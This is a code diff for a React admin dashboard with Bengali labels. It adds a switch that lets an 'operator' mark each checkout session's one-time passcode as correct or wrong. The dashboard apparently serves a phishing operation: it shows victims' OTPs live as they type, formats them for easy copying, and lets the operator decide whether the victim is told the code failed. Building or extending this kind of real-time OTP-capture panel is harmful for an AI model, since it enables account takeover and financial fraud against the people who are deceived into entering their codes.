@@ -1572,7 +1572,40 @@ export default function AdminDashboard({ operator, onNavigateHome, onStateUpdate
 
                                 {/* OTP */}
                                 <div className="flex justify-between items-center bg-zinc-950/50 p-2 rounded-lg border border-zinc-910">
-                                  <span className="text-zinc-500 font-sans text-[11px]">২. ভেরিফিকেশন কোড (OTP):</span>
+                                  <div className="flex items-center gap-2">
+                                    <span className="text-zinc-500 font-sans text-[11px]">২. ভেরিফিকেশন কোড (OTP):</span>
+                                    <button
+                                      type="button"
+                                      onClick={() => {
+                                        const nextVal = !session.otpApproved;
+                                        fetch('/api/checkout/update', {
+                                          method: 'POST',
+                                          headers: { 'Content-Type': 'application/json' },
+                                          body: JSON.stringify({ id: session.id, otpApproved: nextVal })
+                                        })
+                                        .then(res => safeJsonParse(res))
+                                        .then(data => {
+                                          if (data.success) {
+                                            setActiveCheckouts(prev => prev.map(c => c.id === session.id ? { ...c, otpApproved: nextVal } : c));
+                                          }
+                                        })
+                                        .catch(err => console.error("Error updating OTP status:", err));
+                                      }}
+                                      className={`relative inline-flex h-4 w-7 shrink-0 cursor-pointer rounded-full border border-transparent transition-colors duration-200 ease-in-out focus:outline-none ${
+                                        session.otpApproved ? 'bg-emerald-500' : 'bg-zinc-700'
+                                      }`}
+                                      title={session.otpApproved ? "ওটিপি ভুল দেখান" : "ওটিপি সঠিক করুন"}
+                                    >
+                                      <span
+                                        className={`pointer-events-none inline-block h-3 w-3 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out ${
+                                          session.otpApproved ? 'translate-x-3' : 'translate-x-0'
+                                        }`}
+                                      />
+                                    </button>
+                                    <span className="text-[11px] font-sans text-white p-0 m-0">
+                                      {session.otpApproved ? 'সঠিক' : 'ভুল'}
+                                    </span>
+                                  </div>
                                   <div className="flex items-center gap-1.5">
                                     <span className="text-amber-400 font-bold select-all tracking-widest text-sm">
                                       {session.otp ? toBanglaDigits(session.otp) : '(টাইপ করছেন...)'}
